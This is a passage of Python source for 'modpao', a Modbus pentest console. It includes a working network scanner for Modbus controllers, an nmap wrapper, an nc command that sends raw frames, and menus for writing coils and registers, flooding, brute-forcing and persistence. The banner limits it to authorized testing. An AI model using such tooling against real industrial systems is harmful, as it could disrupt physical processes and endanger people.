  flags:  -s SLAVE (default = uid)    --no-crc (gateway adds CRC itself)
  then send:  {C.DIM}echo <HEX> | xxd -r -p | nc <host> <port>{C.RS}
  {C.DIM}ex: build read h 33 | build write c 5 1 | build write h 33 100 -s 82 --no-crc{C.RS}
  {C.OR}b{C.RS} = back to main menu""",

"tag": f"""{C.OR}{C.BD}TAG{C.RS} - give your own names to registers/coils (shown in scans)
  add TYPE ADDR NAME     add a label   (add c 1 master)
  del ID                 remove by id
  list                   show all tags
    TYPE: c=coil  di=discrete  h=holding  ir=input
  {C.DIM}your names replace the %QW/%MW column when they match{C.RS}
  {C.OR}b{C.RS} = back to main menu""",
}



# --------------------------------------------------------- discover ----------
def parse_ips(spec):
    ips = []
    for part in str(spec).split(","):
        part = part.strip()
        if not part:
            continue
        if "/" in part:
            ips += [str(x) for x in ipaddress.ip_network(part, strict=False).hosts()]
        elif "-" in part.split(".")[-1]:
            base, last = part.rsplit(".", 1)
            a, b = last.split("-")
            ips += [f"{base}.{i}" for i in range(int(a), int(b) + 1)]
        else:
            ips.append(part)
    return ips


def _tcp_open(ip, port, timeout=0.6):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except OSError:
        return False


def _modbus_confirm(ip, port):
    try:
        c = ModbusTcpClient(ip, port=port, timeout=1.5)
        if not c.connect():
            return False, None
        rr = c.read_holding_registers(0, count=1, **_id_kw(c.read_holding_registers, 1))
        c.close()
        if rr is None:
            return False, None
        return True, {"hreg0": "exc" if rr.isError() else rr.registers[0]}
    except Exception:
        return False, None


def _nmap_discover(spec_tokens, port):
    if not shutil.which("nmap"):
        err("nmap not installed (apt install nmap) - use the built-in scan instead")
        return
    cmd = ["nmap", "-Pn", "-p", str(port), "--open", "--script", "modbus-discover"] + spec_tokens
    info("running: " + " ".join(cmd))
    try:
        subprocess.run(cmd, check=False)
    except Exception as e:
        err(f"nmap failed: {e}")


def m_discover(flags, args):
    if not args:
        info("DISCOVER: discover IP-RANGE   (172.19.5.1-254 | 172.19.5.0/24 | 172.19.5.3)")
        info("  flags: -p PORT (default 502)  --nmap (deep scan)  --add (save hits as sessions)")
        return
    port = int(flags.get("p", 502))
    if flags.get("nmap"):
        _nmap_discover(args, port); return
    ips = []
    for a in args:
        ips += parse_ips(a)
    info(f"scanning {len(ips)} hosts on tcp/{port} (built-in)...")
    open_hosts = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=128) as ex:
        futs = {ex.submit(_tcp_open, ip, port): ip for ip in ips}
        for f in concurrent.futures.as_completed(futs):
            if f.result():
                open_hosts.append(futs[f])
    found = []
    for ip in sorted(open_hosts, key=lambda x: tuple(int(o) for o in x.split("."))):
        good, meta = _modbus_confirm(ip, port)
        if good:
            vuln(f"{ip}:{port} MODBUS OK (hreg0={meta['hreg0']})"); found.append(ip)
        else:
            warn(f"{ip}:{port} open but no Modbus response")
    ok(f"discovery done: {len(found)} Modbus host(s): {found}")
    if found and flags.get("add"):
        for ip in found:
            s = blank_session("host_" + ip.split(".")[-1]); s["ip"] = ip
            STATE["sessions"].append(s)
        autosave(); ok(f"added {len(found)} session(s) - use 8 to list")


def run_mode(mode, flags, pos):
    if mode == "enum":
        if pos and pos[0] in ("c", "di", "h", "ir"):
            pos = ["read"] + pos
        m_enum(flags, pos)
    elif mode == "monitor": m_monitor(flags, pos)
    elif mode == "watch":   m_watch(flags, pos)
    elif mode == "write":   m_write(flags, pos)
    elif mode == "persist": m_persist(flags, pos)
    elif mode == "auto":    m_auto(flags, pos)
    elif mode == "discover": m_discover(flags, pos)
    elif mode == "rtu":     m_rtu(flags, pos)
    elif mode == "tag":     m_tag(flags, pos)


def _safe(fn, *a):
    try:
        fn(*a)
    except ConnectionError as e:
        err(str(e))
    except KeyboardInterrupt:
        info("(interrupted)")
    except Exception as e:
        err(f"{type(e).__name__}: {e}")
        if VERBOSE: traceback.print_exc()


def prompt():
    s = sess(); lock = ("[U]" if LIVE is not None else "") + ("[A]" if s["auth_map"] else "")
    ipp = f"{s['ip'] or '-'}:{s['port']}"
    m = f" {C.OR2}({MODE}){C.RS}" if MODE else ""
    return f"{C.OR}modpao {C.RS}[{C.OR2}{s['name']}{C.RS} {C.CY}{ipp}{C.RS} uid={s['uid']}{lock}]{m}{C.OR}>{C.RS} "


def handle(line):
    global MODE
    parts = line.split()
    if not parts:
        return True
    audit(line)
    low0 = parts[0].lower()

    # navigation / universal
    if low0 in ("exit", "quit", "q"):
        return False
    if low0 in ("b", "back"):
        if MODE:
            MODE = None; info("back to main menu")
        else:
            info("already at main menu (type help)")
        return True
    if low0 in ("help", "?"):
        print(MODE_HELP[MODE] if MODE else HELP); return True

    pos, flags = split_flags(parts[1:])
    if flags.get("v"):
        globals()["VERBOSE"] = True

    # global commands available in any mode
    if low0 == "set" and len(pos) >= 2:
        key, val = pos[0], pos[1]; s = sess()
        if key in ("ip", "wordlist", "decode", "name"): s[key] = val
        elif key in ("port", "uid"): s[key] = int(val)
        elif key == "slave": s["slave"] = None if val == "none" else parse_addrs(val)
        else: err(f"unknown key '{key}'"); return True
        autosave(); ok(f"{key} = {s.get(key)}"); return True
    if low0 == "use":
        m_use(pos); return True
    if low0 in ("s",):
        m_S(); return True
    if low0 in ("8", "session", "sessions"):
        m_sessions(pos); return True

    if low0 == "verbose":
        globals()["VERBOSE"] = bool(pos and pos[0] == "on")
        ok(f"verbose {'on' if VERBOSE else 'off'}"); return True
    if low0 == "misc":
        print(MISC); return True
    if low0 == "unlock":
        u = uid_from(flags)
        if LIVE is not None:
            try: LIVE.__exit__(None, None, None)
            except Exception: pass
        try:
            _ot = OT(sess()["ip"], sess()["port"], u); _ot.__enter__()
        except Exception as e:
            err(f"unlock: cannot connect - {e}"); return True
        if sess()["auth_map"]:
            _apply_auth(_ot); time.sleep(0.3)
        globals()["LIVE"] = _ot
        ok("unlocked - connection HELD + authed once; writes reuse it (no re-auth, like solve.py)")
        info("  now write (add --fc23 if firewalled). type  lock  when done.")
        return True
    if low0 == "lock":
        if LIVE is not None:
            try: LIVE.__exit__(None, None, None)
            except Exception: pass
            globals()["LIVE"] = None
            ok("held connection closed (locked)")
        else:
            info("no held connection")
        return True
    if low0 == "auth":
        _safe(m_auth, flags, pos); return True
    if low0 in ("guide", "start", "tutorial"):
        print(GUIDE); return True

    # one-shot menus (no persistent mode)
    if low0 in ("0", "info"):
        _safe(m_info, flags); return True
    if low0 == "brute":
        _safe(m_brute, flags); return True

    # enter (or switch) a mode; data actions only happen INSIDE a mode
    if low0 in MODES:
        MODE = MODES[low0]; print(MODE_HELP[MODE])
        if pos or flags:
            warn("you are in the mode now - retype WITHOUT the number, e.g. c 1-20")
        return True

    # inside a mode: the whole line is a mode command (no need to type the verb)
    if MODE:
        mpos, mflags = split_flags(parts)
        _safe(run_mode, MODE, mflags, mpos); return True

    # main menu: refuse data actions to avoid typos
    warn(f"'{low0}' does nothing at the main menu - enter a mode first (type 1-9) or 'help'")
    return True


# --------------------------------------------------------- tab completion ----
COMMANDS = ["help", "exit", "set", "use", "session", "info", "enum", "read",
            "monitor", "watch", "write", "persist", "rtu", "auto", "brute", "S", "8",
            "0", "1", "2", "3", "4", "5", "6", "7", "9", "00", "b", "discover", "verbose", "misc", "guide", "auth", "tag", "unlock", "lock"]
SUB = {"enum": ["read", "scan", "flood"], "read": ["c", "di", "h", "ir"],
       "scan": ["h", "ir", "-u"], "flood": ["c", "di", "h", "ir"],
       "persist": ["fc23", "all", "--flood"],
       "set": ["ip", "port", "uid", "slave", "decode"], "auto": ["recon", "writable", "slave"],
       "8": ["new", "save", "del", "export"]}
MODE_SUB = {"enum": ["read", "scan", "flood", "c", "di", "h", "ir"],
            "monitor": ["c", "di", "h", "ir"], "watch": ["c", "di", "h", "ir", "thr"],
            "write": ["c", "h"], "persist": ["h", "c", "fc23", "all", "--flood"],
            "auto": ["recon", "writable", "slave", "full"], "discover": [],
            "rtu": ["build", "read", "write", "c", "h"],
            "tag": ["add", "del", "list"]}


def completer(text, state):
    buf = readline.get_line_buffer()
    toks = buf.split()
    first_word = len(toks) <= 1 and not buf.endswith(" ")
    if MODE:
        base = MODE_SUB.get(MODE, []) + ["b", "help", "exit"]
        opts = [s for s in base if s.startswith(text)]
    elif first_word:
        opts = [c for c in COMMANDS if c.startswith(text)]
    else:
        first = toks[0]
        base = [s["name"] for s in STATE["sessions"]] if first == "use" else SUB.get(first, [])
        opts = [s for s in base if s.startswith(text)]
    return opts[state] if state < len(opts) else None


def setup_readline():
    if not HAVE_RL:
        warn("readline not available - no tab-complete (pip install pyreadline3 on Windows)")
        return
    try:
        readline.read_history_file(HISTORY)
    except OSError:
        pass
    atexit.register(lambda: readline.write_history_file(HISTORY))
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")


def banner():
    o, o2, r, rs = C.OR, C.OR2, C.RED, C.RS
    print(rf"""{r}   __  __  ___  ___  ___  ___   ___{rs}
{o}  |  \/  |/ _ \|   \| _ \/ _ \ / _ \\{rs}   {o}{C.BD}m o d p a o{rs}
{o2}  | |\/| | (_) | |) |  _/ (_) | (_) |{rs}  {C.DIM}modbus pentest console{rs}
{r}  |_|  |_|\___/|___/|_|  \___/ \___/{rs}   {C.DIM}multi-session . resume . tab{rs}
{C.DIM}   authorized testing only{rs}   type {o}help{rs}
""")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip"); ap.add_argument("--port", type=int)
    ap.add_argument("--uid", type=int); ap.add_argument("--new", help="start a fresh named session")
    a = ap.parse_args()

    resumed = load_state()
    if a.new:
        STATE["sessions"].append(blank_session(a.new)); STATE["current"] = len(STATE["sessions"]) - 1
    if a.ip: sess()["ip"] = a.ip
    if a.port: sess()["port"] = a.port
    if a.uid is not None: sess()["uid"] = a.uid
    autosave()

    banner()
    if resumed:
        ok(f"resumed session [{STATE['current']}] {sess()['name']} "
           f"({sess()['ip'] or 'no ip'}) - {len(STATE['sessions'])} total")
    info("new here? type  guide  for a step-by-step walkthrough, or  help  for the menu.")
    setup_readline()

    while True:
        try:
            line = input(prompt())
        except (EOFError, KeyboardInterrupt):
            print(); break
        stop = False
        for seg in line.split("|"):
            seg = seg.strip()
            if not seg:
                continue
            if not handle(seg):
                stop = True
                break
        if stop:
            break
    if LIVE is not None:
        try: LIVE.__exit__(None, None, None)
        except Exception: pass
    autosave(); info("saved. bye")


if __name__ == "__main__":
    main()
